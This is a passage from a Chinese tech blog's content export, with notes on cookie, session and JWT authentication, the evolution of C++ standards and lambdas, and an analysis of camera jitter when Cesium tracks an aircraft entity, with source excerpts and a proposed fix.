<li>用户收到HTTP响应后，便看不到任何敏感数据了。在此后的请求中发送该Cookie给服务器。</li>
<li>服务器收到此后的HTTP请求后，发现Cookie中有SessionID，进行放篡改验证。</li>
<li>如果通过了验证，根据该ID从Redis中取出对应的用户对象， 查看该对象的状态并继续执行业务逻辑。</li>
</ol>
<h2 id="Session安全隐患"><a href="#Session安全隐患" class="headerlink" title="Session安全隐患"></a>Session安全隐患</h2><p>Session ID作为Cookie存储在浏览器端，因此存在被劫持的风险，尤其是开发者没有正确的关闭会话。用户关闭会话时，应删除传递 Session ID 的 Cookie，同时撤销服务器端的Session内容。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* 普通用户登出 *&#x2F;</span><br><span class="line">router.post(&#39;&#x2F;signout&#39;, function(req, res, next) &#123;</span><br><span class="line">    if (_.isEmpty(req.body) &#x3D;&#x3D;&#x3D; false) &#123;</span><br><span class="line">        req.session.account &#x3D; null; &#x2F;&#x2F; 删除session</span><br><span class="line">        res.json(&#123;</span><br><span class="line">            message: &#39;登出成功！&#39;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        res.send(406, &#123; message: &#39;The params is not correct!&#39; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><p>Token是用户的验证方式,最简单的token组成:uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign(签名，由token的前几位+盐以哈希算法压缩成一定长的十六进制字符串，可以防止恶意第三方拼接token请求服务器)。</p>
<h2 id="基于Token的身份验证流程"><a href="#基于Token的身份验证流程" class="headerlink" title="基于Token的身份验证流程"></a>基于Token的身份验证流程</h2><p>使用基于 Token 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的：</p>
<ol>
<li>客户端使用用户名跟密码请求登录</li>
<li>服务端收到请求，去验证用户名与密码</li>
<li>验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端</li>
<li>客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里</li>
<li>客户端每次向服务端请求资源的时候需要带着服务端签发的 Token</li>
<li>服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据</li>
</ol>
<h2 id="基于Token方法的优势"><a href="#基于Token方法的优势" class="headerlink" title="基于Token方法的优势"></a>基于Token方法的优势</h2><ul>
<li>JWT 方法允许我们进行AJAX调用任何服务器或域。由于HTTP头是用来传输用户信息的。</li>
<li>没必要在服务器存储一个单独的session。JWT本身传达全部的信息。</li>
<li>服务器端减少到只是一个API和可以通过CDN服务的静态资源（HTML，CSS，JS)。</li>
<li>认证系统是手机兼容的，任何设备上可以生成令牌。</li>
<li>由于已经消除了cookie的需要，也不再需要保护跨站请求。</li>
<li>API密钥提供非此即彼的解决方案，然而JWT提供更颗粒度的控制，它可以用于任何调试目的的检查。</li>
<li>API密钥依赖于中央存储和服务。JWT可以自发行或者外部服务在允许的范围和期限发布它。</li>
</ul>
<h2 id="JWT结构"><a href="#JWT结构" class="headerlink" title="JWT结构"></a>JWT结构</h2><p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
<p>一个JWT实际上就是一个字符串，它由三部分组成，头部、载荷与签名。</p>
<h1 id="Cookie、Session和Token对比"><a href="#Cookie、Session和Token对比" class="headerlink" title="Cookie、Session和Token对比"></a>Cookie、Session和Token对比</h1><h2 id="cookie与session的区别"><a href="#cookie与session的区别" class="headerlink" title="cookie与session的区别"></a>cookie与session的区别</h2><ol>
<li>cookie数据存放在客户端上，session数据放在服务器上。</li>
<li>cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗。考虑到安全应当使用session。</li>
<li>session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能。考虑到减轻服务器性能方面，应当使用COOKIE。</li>
</ol>
<h2 id="session与token的区别"><a href="#session与token的区别" class="headerlink" title="session与token的区别"></a>session与token的区别</h2><p>作为身份认证token安全性比session好，因为每个请求都有签名还能防止监听以及重放攻击。</p>
<p>Session 是一种HTTP存储机制，目的是为无状态的HTTP提供的持久机制。Session 认证只是简单的把User 信息存储到Session 里，因为SID 的不可预测性，暂且认为是安全的。这是一种认证手段。 但是如果有了某个User的SID,就相当于拥有该User的全部权利.SID不应该共享给其他网站或第三方。</p>
<p>Token, 如果指的是OAuth Token 或类似的机制的话，提供的是 认证 和 授权，认证是针对用户，授权是针对App。其目的是让某App有权利访问某用户的信息。这里的Token是唯一的。不可以转移到其它App上，也不可以转到其它用户上。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://wiki.jikexueyuan.com/project/node-lessons/cookie-session.html" target="_blank" rel="noopener">cookie 和 session</a>, by 极客学院.</li>
<li><a href="https://harttle.land/2015/08/10/cookie-session.html" target="_blank" rel="noopener">Cookie/Session的机制与安全</a>, by Harttle Land.</li>
<li><a href="https://python.freelycode.com/contribution/detail/84" target="_blank" rel="noopener">Python中关于JSON网络令牌的实例教程</a>, by Python部落.</li>
<li><a href="https://www.jianshu.com/p/576dbf44b2ae" target="_blank" rel="noopener">什么是 JWT – JSON WEB TOKEN</a>, by Dearmadman</li>
<li><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">JSON Web Token 入门教程</a>,by 阮一峰.</li>
<li><a href="https://github.com/localForage/localForage" target="_blank" rel="noopener">localForage</a>,by github.</li>
<li><a href="https://juejin.cn/post/6850418117286477831" target="_blank" rel="noopener">node session 实现登录状态持久化</a>,by 开心的米卡.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>C++标准演化简介</title>
    <url>/2019/06/26/CPlusPlus%E6%A0%87%E5%87%86%E6%BC%94%E5%8C%96%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>最近阅读采用C++编写的MAVROS源码，遇到很多C++语言的新特性，理解起来很费劲，因此，特地分析一下C++标准演变过程，学习其进化过程中引入的新特性，提高C++源码阅读效率。</p>
<h1 id="C-标准演变"><a href="#C-标准演变" class="headerlink" title="C++标准演变"></a>C++标准演变</h1><p>2017年12月05日，ISO C++ 委员会正式发布了 C++ 17 标准，官方名称为 ISO/IEC 14882:2017。之前发布的C++标准有C++14、C++11、C++03、C++98。</p>
<h2 id="C-98"><a href="#C-98" class="headerlink" title="C++98"></a>C++98</h2><p>C++98是第一个C++标准。它分为两个部分：核心语言和C++标准程序库；后者包含了大部分标准模板库和C标准程序库的稍加修改版本。存在许多不属于标准部分的C++程序库，且使用外部链接，程序库甚至可以用C撰写。</p>
<p>C++标准程序库充分吸收了C标准程序库，并佐以少许的修改，使其与C++良好的运作。另一个大型的程序库部分，是以标准模板库（STL）为基础，STL于1994年2月正式成为ANSI/ISO C++。它提供了实用的工具，如容器类（如：Array和Vector），迭代器（广义指针）提供容器以类似数组的访问方式，以及泛型算法进行搜索和排序的运算。此外还提供了(multi)map和(multi)set，它们都共享相似的成员函数。因此，以下成为可能，使用模板撰写泛型算法，它可以和任何容器或在任何以迭代器定义的序列上运作。如同C，使用#include指令包含标准表头，即可访问程序库里的功能。C++提供69个标准表头，其中19个不再赞成使用。</p>
<p>使用标准模板库（例如：使用std::vector或std::string来取代C风格的数组或字符数组）有助于导向更安全和更灵活的软件。</p>
<p>在STL在纳入C++标准以前，是来自HP和后来的SGI的第三方程式库，标准中并未称之为“STL”，它只是标准库中的一部分，但仍有许多人使用这个名称，以别于其它的标准库（输入／输出流、国际化、诊断、C程序库子集，等等）。 另外，如std::basic_string此类标准委员会添加的接口，有时也被误认为STL；实际上它们并不存在于原始的SGI STL中，在标准化后SGI STL才从标准库吸收加入其中。</p>
<h2 id="C-03"><a href="#C-03" class="headerlink" title="C++03"></a>C++03</h2><p>C++03 是 C++ 语言国际标准的一个版本，正式名称是 ISO/IEC 14882:2003。该标准由国际标准化组织（ISO）和国际电工委员会（IEC）共同制定。</p>
<p>C++03 取代了 C++ 标准的前一个版本 C++98，后被 C++11 所取代。C++03 主要是在前一个版本的基础上针对实现方的一些问题进行了修复，从而在各个实现间达到一致、保持了可移植性。该版本共涉及 92 项核心语言缺陷报告、125 项库缺陷报告，所提供的新特性只有一项：值初始化（英语：value initialization）。</p>
<p>C++03 的第 69 号库缺陷报告非常值得一提，为了解决该问题，标准中加入了“std::vector 中的元素必须连续存储”的要求。</p>
<h2 id="C-11"><a href="#C-11" class="headerlink" title="C++11"></a>C++11</h2><p>C++11，先前被称作C++0x，即ISO/IEC 14882:2011，是C++编程语言的一个标准。它取代第二版标准ISO/IEC 14882:2003（第一版ISO/IEC 14882:1998公开于1998年，第二版于2003年更新，分别通称C++98以及C++03，两者差异很小），且已被C++14取代。相比于C++03，C++11标准包含核心语言的新机能，而且扩展C++标准程序库，并入了大部分的C++ Technical Report 1程序库（数学的特殊函数除外）。 ISO／IEC JTC1/SC22/WG21 C++标准委员会计划在2010年8月之前完成对最终委员会草案的投票，以及于2011年3月召开的标准会议完成国际标准的最终草案。然而，WG21预期ISO将要花费六个月到一年的时间才能正式发布新的C++标准。为了能够如期完成，委员会决定致力于直至2006年为止的提案，忽略新的提案。最终于2011年8月12日公布，并于2011年9月出版。</p>
<p>2012年2月28日的国际标准草案是最接近于C++11标准的草案，差异仅有编辑上的修正。</p>
<p>像C++这样的编程语言，透过一种演化的的过程来发展其定义。这个过程不可避免地将引发与现有代码的兼容问题，在C++的发展过程中偶尔会发生。不过根据比雅尼·斯特劳斯特鲁普（C++的创始人并且是委员会的一员）表示，新的标准将几乎100%兼容于现有标准。</p>
<h2 id="C-14"><a href="#C-14" class="headerlink" title="C++14"></a>C++14</h2><p>C++14是C++的现行标准的非正式名称，正式名称为”International Standard ISO/IEC 14882:2014(E) Programming Language C++”。C++14旨在作为C++11的一个小扩展，主要提供漏洞修复和小的改进。C++14标准的委员会草案（Committee Draft）N3690于2013年5月15日发表。工作草案（Working Draft）N3936已于2014年3月2日完成。最终的投票期结束于2014年8月15日，结果（一致通过）已于8月18日公布。</p>
<h2 id="C-17"><a href="#C-17" class="headerlink" title="C++17"></a>C++17</h2><p>C++17又称C++1z，是C++的现行标准的非正式名称，正式名称为”International Standard ISO/IEC Programming Language C++”。C++17旨在作为大型扩展，最终的投票期将于2017年结束。</p>
<p>当前不少著名C++编译器已支持C++17仍未定案的草案（draft），例如最新的GCC6已支持C++ concept的C++事务型内存（Transactional Memory），Visual Studio与Clang当前都提供了modules。</p>
<h1 id="C-新语言特性"><a href="#C-新语言特性" class="headerlink" title="C++新语言特性"></a>C++新语言特性</h1><h2 id="Lambda函数与表示式"><a href="#Lambda函数与表示式" class="headerlink" title="Lambda函数与表示式"></a>Lambda函数与表示式</h2><p>在标准C++，特别是当使用C++标准程序库算法函数诸如sort和find，用户经常希望能够在算法函数调用的附近定义一个临时的述部函数（又称谓词函数，predicate function）。由于语言本身允许在函数内部定义类别，可以考虑使用函数对象，然而这通常既麻烦又冗赘，也阻碍了代码的流程。此外，标准C++不允许定义于函数内部的类别被用于模板，所以前述的作法是不可行的。</p>
<p><strong>C++11对lambda（即匿名函数）的支持可以解决上述问题</strong>。</p>
<p>一个lambda函数可以用如下的方式定义：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[](int x, int y) &#123; return x + y; &#125;</span><br></pre></td></tr></table></figure>

<p>这个不具名函数的回返类型是decltype(x+y)。只有在lambda函数匹配”return expression”的形式下，它的回返类型才能被忽略。在前述的情况下，lambda函数仅能为一个述句。</p>
<p>在一个更为复杂的例子中，回返类型可以被明确的指定如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[](int x, int y) -&gt; int &#123; int z &#x3D; x + y; return z + x; &#125;</span><br></pre></td></tr></table></figure>

<p>本例中，一个临时的参数z被创建用来存储中间结果。如同一般的函数，z的值不会保留到下一次该不具名函数再次被调用时。</p>
<p>如果lambda函数没有传回值（例如void），其回返类型可被完全忽略。</p>
<p>定义在与lambda函数相同作用域的参数引用也可以被使用。这种的参数集合一般被称作closure（闭包）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[]      &#x2F;&#x2F; 沒有定义任何变量。使用未定义变量会引发错误。</span><br><span class="line">[x, &amp;y] &#x2F;&#x2F; x以传值方式传入（默认），y以引用方式传入。</span><br><span class="line">[&amp;]     &#x2F;&#x2F; 任何被使用到的外部变量都隐式地以引用方式加以引用。</span><br><span class="line">[&#x3D;]     &#x2F;&#x2F; 任何被使用到的外部变量都隐式地以传值方式加以引用。</span><br><span class="line">[&amp;, x]  &#x2F;&#x2F; x显式地以传值方式加以引用。其余变量以引用方式加以引用。</span><br><span class="line">[&#x3D;, &amp;z] &#x2F;&#x2F; z显式地以引用方式加以引用。其余变量以传值方式加以引用。</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/C%2B%2B" target="_blank" rel="noopener">C++</a>,by wikipedia.</li>
<li><a href="https://zh.cppreference.com/w/cpp/language/history" target="_blank" rel="noopener">C++ 的历史</a>,by cppreference.</li>
<li><a href="https://zh.wikipedia.org/wiki/C%2B%2B03" target="_blank" rel="noopener">C++03</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/C%2B%2B11" target="_blank" rel="noopener">C++11</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/C%2B%2B14" target="_blank" rel="noopener">C++14</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/C%2B%2B17" target="_blank" rel="noopener">C++17</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Cesium摄像头跟踪飞机实体时晃动问题分析</title>
    <url>/2018/11/08/Cesium%E6%91%84%E5%83%8F%E5%A4%B4%E8%B7%9F%E8%B8%AA%E9%A3%9E%E6%9C%BA%E5%AE%9E%E4%BD%93%E6%97%B6%E6%99%83%E5%8A%A8%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>在3D场景下使用Cesium跟踪飞机时会出现摄像头晃动问题，导致地图背景不断晃动，影响观看。下面以最新的Cesium1.51源码为例，解析Cesium 渲染过程原理，分析跟踪实体时摄像头晃动的原因，找出可能的解决方法。</p>
<h1 id="Cesium渲染过程分析"><a href="#Cesium渲染过程分析" class="headerlink" title="Cesium渲染过程分析"></a>Cesium渲染过程分析</h1><p>使用Cesium最简单示例代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var viewer &#x3D; new Cesium.Viewer(&#39;cesiumContainer&#39;);</span><br></pre></td></tr></table></figure>
<p>Viewer是Cesium构建应用的最基础的组件。它又是其他组件的容器，包括：</p>
<ul>
<li>animation:控制时间前进、倒退、暂停以及前进和倒退速度的组件</li>
<li>baseLayerPicker：图层选择组件</li>
<li>fullscreenButton：控制是否全屏的组件</li>
<li>vrButton：控制是否VR显示的组件</li>
<li>geocoder：地理位置搜索组件</li>
<li>homeButton：返回摄像头默认位置按钮组建</li>
<li>infoBox：信息框组件</li>
<li>sceneModePicker：场景模式选择组件</li>
<li>selectionIndicator：选择指示组件</li>
<li>timeline：时间线组件</li>
<li>navigationHelpButton：导航帮助按钮，告诉使用者如何使用鼠标和触摸屏操纵虚拟地球</li>
<li>CesiumWidget：虚拟地球组件</li>
</ul>
<p>其中，虚拟地球组件CesiumWidget是Viewer包含核心组件，在Viewer中创建CesiumWidget对象时，将设置其useDefaultRenderLoop属性。设置该属性将启动渲染函数startRenderLoop。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;from Source&#x2F;Widgets&#x2F;CesiumWidget&#x2F;CesiumWidget.js</span><br><span class="line">useDefaultRenderLoop : &#123;</span><br><span class="line">    get : function() &#123;</span><br><span class="line">        return this._useDefaultRenderLoop;</span><br><span class="line">    &#125;,</span><br><span class="line">    set : function(value) &#123;</span><br><span class="line">        if (this._useDefaultRenderLoop !&#x3D;&#x3D; value) &#123;</span><br><span class="line">            this._useDefaultRenderLoop &#x3D; value;</span><br><span class="line">            if (value &amp;&amp; !this._renderLoopRunning) &#123;</span><br><span class="line">                startRenderLoop(this);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<p>函数startRenderLoop是Cesium渲染的开始，其代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function startRenderLoop(widget) &#123;</span><br><span class="line">    widget._renderLoopRunning &#x3D; true;</span><br><span class="line"></span><br><span class="line">    var lastFrameTime &#x3D; 0;</span><br><span class="line">    function render(frameTime) &#123;</span><br><span class="line">        if (widget.isDestroyed()) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (widget._useDefaultRenderLoop) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                var targetFrameRate &#x3D; widget._targetFrameRate;</span><br><span class="line">                if (!defined(targetFrameRate)) &#123;</span><br><span class="line">                    widget.resize();</span><br><span class="line">                    widget.render();</span><br><span class="line">                    requestAnimationFrame(render);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    var interval &#x3D; 1000.0 &#x2F; targetFrameRate;</span><br><span class="line">                    var delta &#x3D; frameTime - lastFrameTime;</span><br><span class="line"></span><br><span class="line">                    if (delta &gt; interval) &#123;</span><br><span class="line">                        widget.resize();</span><br><span class="line">                        widget.render();</span><br><span class="line">                        lastFrameTime &#x3D; frameTime - (delta % interval);</span><br><span class="line">                    &#125;</span><br><span class="line">                    requestAnimationFrame(render);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            widget._renderLoopRunning &#x3D; false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    requestAnimationFrame(render);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>CesiumWidget组件的render方法随后调用Scene的render方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Scene.prototype.render &#x3D; function(time) &#123;</span><br><span class="line">        if (!defined(time)) &#123;</span><br><span class="line">            time &#x3D; JulianDate.now();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var frameState &#x3D; this._frameState;</span><br><span class="line">        this._jobScheduler.resetBudgets();</span><br><span class="line"></span><br><span class="line">        var cameraChanged &#x3D; this._view.checkForCameraUpdates(this);</span><br><span class="line">        var shouldRender &#x3D; !this.requestRenderMode || this._renderRequested || cameraChanged || this._logDepthBufferDirty || (this.mode &#x3D;&#x3D;&#x3D; SceneMode.MORPHING);</span><br><span class="line">        if (!shouldRender &amp;&amp; defined(this.maximumRenderTimeChange) &amp;&amp; defined(this._lastRenderTime)) &#123;</span><br><span class="line">            var difference &#x3D; Math.abs(JulianDate.secondsDifference(this._lastRenderTime, time));</span><br><span class="line">            shouldRender &#x3D; shouldRender || difference &gt; this.maximumRenderTimeChange;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (shouldRender) &#123;</span><br><span class="line">            this._lastRenderTime &#x3D; JulianDate.clone(time, this._lastRenderTime);</span><br><span class="line">            this._renderRequested &#x3D; false;</span><br><span class="line">            this._logDepthBufferDirty &#x3D; false;</span><br><span class="line">            var frameNumber &#x3D; CesiumMath.incrementWrap(frameState.frameNumber, 15000000.0, 1.0);</span><br><span class="line">            updateFrameNumber(this, frameNumber, time);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Update</span><br><span class="line">        this._preUpdate.raiseEvent(this, time);</span><br><span class="line">        tryAndCatchError(this, update);</span><br><span class="line">        this._postUpdate.raiseEvent(this, time);</span><br><span class="line"></span><br><span class="line">        if (shouldRender) &#123;</span><br><span class="line">            &#x2F;&#x2F; Render</span><br><span class="line">            this._preRender.raiseEvent(this, time);</span><br><span class="line">            tryAndCatchError(this, render);</span><br><span class="line"></span><br><span class="line">            RequestScheduler.update();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        updateDebugShowFramesPerSecond(this, shouldRender);</span><br><span class="line">        callAfterRenderFunctions(this);</span><br><span class="line"></span><br><span class="line">        if (shouldRender) &#123;</span><br><span class="line">            this._postRender.raiseEvent(this, time);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
<p>Scene的render方法中tryAndCatchError函数将调用render函数。在该render函数中，地球的主要要素（地形&amp;影像）的渲染，将在Globe的beginFrame和endFrame之间完成的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function render(scene) &#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    if (defined(scene.globe)) &#123;</span><br><span class="line">        scene.globe.beginFrame(frameState);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    updateEnvironment(scene);</span><br><span class="line">    updateAndExecuteCommands(scene, passState, backgroundColor);</span><br><span class="line">    resolveFramebuffers(scene, passState);</span><br><span class="line"></span><br><span class="line">    passState.framebuffer &#x3D; undefined;</span><br><span class="line">    executeOverlayCommands(scene, passState);</span><br><span class="line"></span><br><span class="line">    if (defined(scene.globe)) &#123;</span><br><span class="line">        scene.globe.endFrame(frameState);</span><br><span class="line"></span><br><span class="line">        if (!scene.globe.tilesLoaded) &#123;</span><br><span class="line">            scene._renderRequested &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中updateAndExecuteCommands负责数据的调度，比如哪些Tile需要创建，这些Tile相关的地形数据，以及涉及到的影像数据之间的调度，都是在该函数中维护。而scene.globe.endFrame中，会对该帧所涉及的GlobeTile的下载，解析等进行处理。</p>
<h1 id="Cesium跟踪实体"><a href="#Cesium跟踪实体" class="headerlink" title="Cesium跟踪实体"></a>Cesium跟踪实体</h1><p>在Viewer组件构造函数内，Viewer订阅了场景组件Scene的渲染后事件postRender，以执行Viewer自己的_postRender函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eventHelper.add(scene.postRender, Viewer.prototype._postRender, this);</span><br></pre></td></tr></table></figure>
<p>Viewer的_postRender函数代码如下，其中updateTrackedEntity函数将更新被跟踪实体的摄像头位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Viewer.prototype._postRender &#x3D; function() &#123;</span><br><span class="line">    updateZoomTarget(this);</span><br><span class="line">    updateTrackedEntity(this);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>updateTrackedEntity函数代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function updateTrackedEntity(viewer) &#123;</span><br><span class="line">    if (!viewer._needTrackedEntityUpdate) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var trackedEntity &#x3D; viewer._trackedEntity;</span><br><span class="line">    var currentTime &#x3D; viewer.clock.currentTime;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;Verify we have a current position at this time. This is only triggered if a position</span><br><span class="line">    &#x2F;&#x2F;has become undefined after trackedEntity is set but before the boundingSphere has been</span><br><span class="line">    &#x2F;&#x2F;computed. In this case, we will track the entity once it comes back into existence.</span><br><span class="line">    var currentPosition &#x3D; Property.getValueOrUndefined(trackedEntity.position, currentTime);</span><br><span class="line"></span><br><span class="line">    if (!defined(currentPosition)) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var scene &#x3D; viewer.scene;</span><br><span class="line"></span><br><span class="line">    var state &#x3D; viewer._dataSourceDisplay.getBoundingSphere(trackedEntity, false, boundingSphereScratch);</span><br><span class="line">    if (state &#x3D;&#x3D;&#x3D; BoundingSphereState.PENDING) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var sceneMode &#x3D; scene.mode;</span><br><span class="line">    if (sceneMode &#x3D;&#x3D;&#x3D; SceneMode.COLUMBUS_VIEW || sceneMode &#x3D;&#x3D;&#x3D; SceneMode.SCENE2D) &#123;</span><br><span class="line">        scene.screenSpaceCameraController.enableTranslate &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (sceneMode &#x3D;&#x3D;&#x3D; SceneMode.COLUMBUS_VIEW || sceneMode &#x3D;&#x3D;&#x3D; SceneMode.SCENE3D) &#123;</span><br><span class="line">        scene.screenSpaceCameraController.enableTilt &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var bs &#x3D; state !&#x3D;&#x3D; BoundingSphereState.FAILED ? boundingSphereScratch : undefined;</span><br><span class="line">    viewer._entityView &#x3D; new EntityView(trackedEntity, scene, scene.mapProjection.ellipsoid);</span><br><span class="line">    viewer._entityView.update(currentTime, bs);</span><br><span class="line">    viewer._needTrackedEntityUpdate &#x3D; false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>除此之外，Viewer组件订阅了Clock组建的onTick事件，以执行其自身的_onTick事件处理函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eventHelper.add(clock.onTick, Viewer.prototype._onTick, this);</span><br></pre></td></tr></table></figure>
<p>在Viewer组件的_onTick事件处理函数中，同样会更新被跟踪实体的摄像头位置。而Cesium摄像头跟踪飞机实体时产生晃动的根源即在此处。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Viewer.prototype._onTick &#x3D; function(clock) &#123;</span><br><span class="line">        var time &#x3D; clock.currentTime;</span><br><span class="line"></span><br><span class="line">        var isUpdated &#x3D; this._dataSourceDisplay.update(time);</span><br><span class="line">        if (this._allowDataSourcesToSuspendAnimation) &#123;</span><br><span class="line">            this._clockViewModel.canAnimate &#x3D; isUpdated;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var entityView &#x3D; this._entityView;</span><br><span class="line">        if (defined(entityView)) &#123;</span><br><span class="line">            var trackedEntity &#x3D; this._trackedEntity;</span><br><span class="line">            var trackedState &#x3D; this._dataSourceDisplay.getBoundingSphere(trackedEntity, false, boundingSphereScratch);</span><br><span class="line">            if (trackedState &#x3D;&#x3D;&#x3D; BoundingSphereState.DONE) &#123;</span><br><span class="line">                entityView.update(time, boundingSphereScratch);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<h1 id="可行的解决方案"><a href="#可行的解决方案" class="headerlink" title="可行的解决方案"></a>可行的解决方案</h1><p>在Viewer组件的_onTick函数做如下修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Viewer.prototype._onTick &#x3D; function(clock) &#123;</span><br><span class="line">        var time &#x3D; clock.currentTime;</span><br><span class="line"></span><br><span class="line">        var isUpdated &#x3D; this._dataSourceDisplay.update(time);</span><br><span class="line">        if (this._allowDataSourcesToSuspendAnimation) &#123;</span><br><span class="line">            this._clockViewModel.canAnimate &#x3D; isUpdated;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var entityView &#x3D; this._entityView;</span><br><span class="line">        if (defined(entityView)) &#123;</span><br><span class="line">            var trackedEntity &#x3D; this._trackedEntity;</span><br><span class="line">            var trackedState &#x3D; this._dataSourceDisplay.getBoundingSphere(trackedEntity, false, boundingSphereScratch);</span><br><span class="line">            if (trackedState &#x3D;&#x3D;&#x3D; BoundingSphereState.DONE) &#123;</span><br><span class="line">                &#x2F;&#x2F;entityView.update(time, boundingSphereScratch);</span><br><span class="line">                var range&#x3D;this.camera.distanceToBoundingSphere(boundingSphereScratch);</span><br><span class="line">                var targetRange&#x3D;range&gt;boundingSphereScratch.radius*10?range:boundingSphereScratch.radius*10;</span><br><span class="line">                var offset&#x3D;new HeadingPitchRange(0.0,-Math.toRadians(45.0),targetRange);</span><br><span class="line">                this.camera.viewBoundingSphere(boundingSphereScratch,offset)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="http://www.cnblogs.com/fuckgiser/p/5744509.html" target="_blank" rel="noopener">Cesium原理篇：1最长的一帧之渲染调度</a>, by 法克鸡丝</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>Cesium</tag>
      </tags>
  </entry>
  <entry>
    <title>D3入门教程</title>
    <url>/2020/07/03/D3%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/</url>
